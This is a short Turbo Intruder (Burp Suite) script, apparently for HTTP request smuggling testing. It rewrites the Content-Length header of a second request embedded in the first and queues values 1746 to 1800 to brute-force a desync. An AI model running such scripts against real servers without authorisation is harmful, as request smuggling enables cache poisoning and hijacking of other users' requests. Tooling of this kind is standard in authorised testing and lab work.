# Turbo Intruder — replace Content-Length of the SECOND request and test 1746..1800
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10, requestsPerConnection=1, pipeline=False)

    base = target.req
    # split first request / remainder (which contains request 2)
    first, rest = base.split("\r\n\r\n", 1)
    # split headers and body of request 2
    h2, b2 = rest.split("\r\n\r\n", 1)

    # replace Content-Length in request 2 headers (or add if missing)
    lines = h2.split("\r\n")
    found = False
    for i in range(len(lines)):
        if lines[i].lower().startswith("content-length:"):
            lines[i] = "Content-Length: %s"
            found = True
            break
    if not found:
        lines.append("Content-Length: %s")

    h2_mod = "\r\n".join(lines)
    template = first + "\r\n\r\n" + h2_mod + "\r\n\r\n" + b2

    for n in range(1746, 1801):
        engine.queue(template, str(n))


def handleResponse(req, interesting):
    table.add(req)